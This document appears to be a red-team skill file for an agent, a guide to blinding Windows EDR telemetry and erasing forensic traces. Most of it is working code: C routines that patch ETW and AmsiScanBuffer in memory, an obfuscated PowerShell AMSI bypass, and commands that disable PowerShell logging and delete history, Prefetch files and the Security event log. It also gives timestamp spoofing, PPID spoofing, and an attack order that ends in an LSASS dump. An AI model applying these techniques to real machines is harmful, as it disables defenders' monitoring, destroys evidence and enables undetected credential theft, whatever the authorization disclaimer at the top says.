# Telemetry Blinding: ETW / AMSI / Anti-Forensics

> Authorized red teaming / adversary emulation / own-product testing only; use against unauthorized targets is forbidden.

An EDR's detection capability depends to a large extent on two telemetry pipelines: ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface).
This document consolidates red team countermeasures against these two pipelines, plus anti-forensics combinations such as Sysmon / PowerShell logging / timestamp spoofing.

Mapped to MITRE ATT&CK: T1562.001 / T1562.002 / T1562.006 / T1070 / T1027.

## 1. ETW Internals

ETW is Windows' built-in high-performance event tracing framework, which EDRs use as "lightweight kernel telemetry".
The providers red teams care about most:

| Provider GUID | Name | Who Uses It |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDRs |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI reporting |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | basic process / thread events |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET loading, JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR startup |

### Key User-Mode APIs

| API | DLL | Purpose |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | write an event (most common) |
| `EtwEventWriteFull` | `ntdll.dll` | event with activity ID |
| `EtwEventWriteEx` | `ntdll.dll` | extended version |
| `NtTraceEvent` | `ntdll.dll` | underlying layer of EtwEventWrite |
| `NtTraceControl` | `ntdll.dll` | control trace sessions (start/stop/query providers) |
| `EtwEventEnabled` | `ntdll.dll` | whether the provider is enabled |
| `EtwEventRegister` | `ntdll.dll` | register a provider |

### Call Chain

```text
Application code EventWrite(...)
  → Microsoft wrapper (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (kernel)
  → kernel ETW core → consumer side (EDR user-mode process subscribed to the session)
```

## 2. Three Ways to Patch ETW

### Method A: EtwEventWrite head patch

Directly rewrite the `ntdll!EtwEventWrite` entry to return success immediately:

```text
Original:
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

After the patch (x64):
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C code:

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // Note: VirtualProtect itself may be hooked -> use an indirect syscall version
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC warning**: writing to ntdll memory is itself the source of `ALPC_MODIFY_PROCESS` / `PROTECTVM` events monitored by ETW-TI.
You **must first use indirect syscalls + bypass the NtProtectVirtualMemory hook before patching**,
otherwise the EDR receives the alert before the patch even takes effect.

### Method B: EtwEventEnabled always-false

More stealthy: instead of modifying `EtwEventWrite`, make `EtwEventEnabled` always return FALSE.
The application layer then concludes "the provider is off" on its own → it never calls `EtwEventWrite`. Friendlier to memory-hash integrity checks (many EDRs verify the bytes of `EtwEventWrite`).

```c
// EtwEventEnabled usually returns BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### Method C: NtTraceControl to disable the provider

Use syscalls to directly shut down the EDR session (intrusive, but touches no ntdll bytes):

```c
// NtTraceControl(EtwpStopTrace, ...)
// Requires SeSystemProfilePrivilege or higher
// Applicable after Local Admin + UAC bypass
```

Rarely used in practice, because:

- Stopping the session itself triggers an "ETW provider stopped" event that another pipeline picks up
- High privileges are required

### Method D: kernel-mode ETW patch (only when you already have BYOVD / kernel read-write)

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
Zero them out directly so all ETW-TI events are dropped
```

This belongs to the BYOVD stage of attack-chain; this skill does not go deeper.

## 3. AMSI Bypass

AMSI is the interface Windows provides to PowerShell / .NET / WMI / VBA for antivirus scanning of scripts before execution.
The most common red team encounter is PowerShell + AMSI.

### Classic AmsiScanBuffer Patch

```c
// Write at the amsi.dll!AmsiScanBuffer entry:
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32-bit) or ret (64-bit)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

One-liner PowerShell version (for detection-countermeasure reference only; it is itself signatured / blocked by Defender):

```powershell
# Conceptual demo — real environments must combine obfuscation / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### Advanced Option 1: Hardware Breakpoint AMSI Bypass

Touches no amsi.dll memory (won't trigger integrity scans):

1. AddVectoredExceptionHandler
2. Set `DR0` at the `AmsiScanBuffer` entry
3. On VEH hit, set `RAX = 0x80070057`, `RIP = address of the ret instruction`, `RSP += 8`
4. ContinueExecution

This shares the same infrastructure as the HWBP Blindside in unhook-techniques.md; the VEH can be shared.

### Advanced Option 2: AmsiContext / AmsiSession corruption

Craft a malformed `AmsiContext` structure so `AmsiScanBuffer` returns success early because an internal check fails:

```text
// The AmsiContext header should be the "AMSI" magic
// Change it to "XXXX" → AmsiScanBuffer's internal check fails but returns S_OK + AMSI_RESULT_CLEAN
```

### Advanced Option 3: reflectively load a copy of amsi.dll

Instead of the system amsi.dll, reflectively load a clean copy into your own process and redirect the PowerShell engine's calls to AMSI.
Suited to advanced EDRs that already intercept PowerShell.exe startup at the loading stage.

## 4. Anti-Forensics: Clearing Traces

### Disabling PowerShell ScriptBlock Logging

```powershell
# Registry (admin required)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy path:
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### Clearing PowerShell history

```powershell
# Current session
Clear-History
# Persistent history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### Clearing Prefetch

```powershell
# Requires SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# Clear everything (heavy-handed, use with caution)
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### Clearing ETL logs

```powershell
# Stop the session, then delete the etl
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# Note: directly deleting the .evtx causes the Event Log Service to recreate it and write a "log cleared" event (Event ID 1102)
# Stealthier: patch wevtsvc.dll's EventLog APIs in memory (this is T1070.001)
```

### Timestamp spoofing (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Evading Sysmon Monitoring

Sysmon is the most common free telemetry in the community (many enterprises use olaf's configuration).
Key events:

| Event ID | Meaning |
|----------|------|
| 1 | ProcessCreate (incl. PPID, CommandLine, Hash) |
| 7 | ImageLoad (DLL loads) |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess (OpenProcess) |
| 11 | FileCreate |
| 12/13/14 | registry |
| 22 | DNS Query |
| 25 | ProcessTampering (image hollowing) |

### Evasion Approaches

1. **Create no new processes** — operate entirely inside an already-injected process, avoiding Event ID 1
2. **PPID spoof** — use `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` to set the PPID to `explorer.exe` so Sysmon's ProcessCreate looks legitimate

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + leave images alone** — Process Hollowing is already captured by Event ID 25 on recent Sysmon.
   Prefer **module stomping** (overwriting a section of an already-loaded legitimate DLL) or newer techniques like **dirty vanity**,
   combined with PPID spoofing
4. **No remote threads** — avoid Event ID 8; execute inside your own process with `NtCreateThreadEx` / APC / Early Bird APC
5. **DNS over DoH / HTTPS** — avoid Event ID 22

## 6. Call Stack Spoofing + timestamps to make events look like legitimate software

Even when ProcessCreate cannot be avoided (e.g., some scenarios require spawning a child), you can:

- Rewrite the CommandLine into a format similar to some legitimate software
- Spoof the PPID to services.exe (masquerade as an SCM-launched service)
- Modify the Image hash seen at ImageLoad: through module stomping, put the implant code inside the memory space of a signed DLL
- Combine with CallstackSpoofer: even with EnableCallTracing enabled, Sysmon never sees the implant frames

## 7. Practical OPSEC: Order of Operations

**With the wrong order the EDR gets the alert first**, causing subsequent actions to be cut off immediately.

Correct order:

```text
1. AMSI bypass (prefer HWBP to avoid writing amsi.dll)
   ─── so .NET / PowerShell loads the implant without being scanned
2. ETW patch (patch EtwEventWrite first, before any other syscall)
   ─── turn off telemetry for all your subsequent actions
3. Call NtProtectVirtualMemory via indirect syscall
   ─── prepare a "safe" channel for memory permission switches
4. Unhook ntdll (Peruns Fart) or enable indirect syscalls
   ─── wipe out user-mode hooks
5. Call stack spoof setup
   ─── prepare the fake stack for all later syscalls
6. Actual payload execution (injection / lateral movement / LSASS dump)
7. Clear traces (PowerShell history / Prefetch / timestamps)
```

Examples of wrong order:

```text
❌ Unhook ntdll first → ETW-TI immediately reports PROTECTVM + module modification → the SOC already has the alert
❌ Dump LSASS first → AMSI / ETW not yet suppressed → high-confidence T1003.001 alert
✅ AMSI → ETW → unhook → spoof → payload
```

## References

- ETW Threat Intelligence Provider: <https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW patching survey: <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI bypass collection: <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf config: <https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing: <https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask: <https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation: <https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging): <https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking): <https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal): <https://attack.mitre.org/techniques/T1070/>

## Routing Callback

After completing this trilogy (hook survey → unhook → telemetry blinding), return to `SKILL.md` Step 5 to verify in a sandbox,
then proceed to the next stage via the `attack-chain/` initial access and lateral movement chapters.
